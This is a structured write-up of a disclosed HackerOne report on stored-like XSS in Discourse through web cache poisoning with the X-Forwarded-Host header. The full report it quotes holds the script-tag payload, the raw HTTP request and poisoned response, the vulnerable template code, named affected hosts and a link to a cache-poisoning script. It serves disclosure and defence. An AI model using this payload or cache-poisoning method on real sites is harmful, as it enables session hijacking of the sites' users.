# Web Cache Deception Attack with XSS via X-Forwarded-Host Header in Discourse

## Metadata
- **Source:** HackerOne
- **Report:** 394016 | https://hackerone.com/reports/394016
- **Submitted:** 2018-08-13
- **Reporter:** bobrov
- **Program:** Discourse
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), HTTP Header Injection, Web Cache Poisoning, Cache Deception
- **CVEs:** None
- **Category:** web-api

## Summary
Discourse instances are vulnerable to XSS and web cache poisoning through unsanitized X-Forwarded-Host header values that are directly embedded in font-face CSS and preload link attributes. The application caches responses for 1 minute based on request start line, Accept, and Accept-Encoding headers, allowing attackers to poison the cache and deliver persistent XSS payloads to all users with matching headers.

## Attack scenario
1. Attacker crafts a malicious X-Forwarded-Host header containing JavaScript payload (e.g., cacheattack'"><script>alert(document.domain)</script>)
2. Attacker sends GET request to vulnerable Discourse instance with specific Accept and Accept-Encoding headers matching common user patterns
3. Server embeds the unsanitized X-Forwarded-Host value into @font-face CSS rules and preload link tags without proper escaping
4. Response is cached by CDN for 1 minute based on request headers matching
5. Subsequent users requesting same URL with matching Accept/Accept-Encoding headers receive poisoned cached response containing XSS
6. Browser executes injected JavaScript in victim's session with victim's privileges and access to sensitive data

## Root cause
The vulnerability stems from two failures: (1) X-Forwarded-Host header value is used unsanitized in template rendering (html_safe in Rails), and (2) insufficient output encoding in CSS and HTML contexts. The caching layer compound this by storing responses based on limited headers without cache-busting mechanisms for header-based content variations.

## Attacker mindset
Attacker leverages trusted proxy headers (X-Forwarded-Host) expecting server-side handling to be secure, combines it with cache poisoning to achieve persistent XSS without direct storage, and exploits response caching mechanics to maximize impact across multiple users with minimal repeated effort.

## Defensive takeaways
- Never trust X-Forwarded-* headers without explicit whitelist validation and configuration in reverse proxy/load balancer
- Always properly encode output based on context (HTML, CSS, JavaScript, URL) - avoid blanket html_safe calls
- Implement strict Content-Security-Policy headers to mitigate XSS impact
- Use cache keys that include all headers influencing response content (Vary header)
- Validate and sanitize all user-controllable input including headers at entry points
- Apply defense-in-depth with multiple encoding layers
- Regularly audit template rendering for unsafe operations like Rails' html_safe

## Variant hunting
Search for other instances of html_safe usage with header variables in Discourse codebase; check for similar patterns in other proxy-aware frameworks; test other X-Forwarded-* headers (X-Forwarded-Proto, X-Forwarded-For) for injection points; examine CDN caching policies for other header-based cache poisoning vectors; look for similar vulnerabilities in CSS generation, meta tags, and canonical URL attributes that reference forwarded headers.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1071 - Application Layer Protocol (HTTP header manipulation)
- T1499 - Service Exhaustion Attack (cache poisoning at scale)
- T1566 - Phishing (cached XSS served to multiple users)

## Notes
Multiple high-profile Discourse instances affected including mozilla.org and nextcloud.com. Writeup demonstrates practical exploitation with PoC script automating cache poisoning with common header combinations. Attack is particularly dangerous because caching makes the XSS persistent and affects all users matching the cache key criteria, effectively creating stored XSS from a reflected vulnerability.

## Full report
<details><summary>Expand</summary>

This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.
List of vulnerable hosts:
```
discourse.mozilla.org
forum.learning.mozilla.org
forum.glasswire.com
help.nextcloud.com
meta.discourse.org
```

Description XSS
===
The Web application is vulnerable to XSS through the X-Forwarded-Host header. 

**Vulnerable code**
https://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18
```
<% woff2_url = "#{asset_path("fontawesome-webfont.woff2")}?#{font_domain}&v=4.7.0".html_safe %>

<link rel="preload" href="<%=woff2_url%>" as="font" type="font/woff2" crossorigin />
...
    src: url('<%=woff2_url %>') format('woff2'),
```




**HTTP Request**
```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```

**HTTP Response**
```html
<link rel="preload" 
   href="https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'">
   <script>alert(document.domain)</script>
   &2&v=4.7.0" as="font" type="font/woff2" crossorigin />
<style>
  @font-face {
    font-family: 'FontAwesome';
    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'">
    <script>alert(document.domain)</script>
    &2&v=4.7.0') format('woff2'),
         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack&#39;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;2&v=4.7.0') format('woff');
  }
</style>
```

Web Cache Deception
===
Also, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:
Request Start Line, Accept, Accept-Encoding.

**Steps To Reproduce**
For a simpler demonstration, I wrote a script.
The script takes the necessary headers from the request and poisons the cache.
You just need to open the cached page.

1) Open URL
```
https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```
2) Open the cached URL that the script displays.

3) Result

{F332797}

## Impact

Attacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.
The impact is like a stored XSS on any page.

</details>

---
*Analysed by Claude on 2026-05-24*
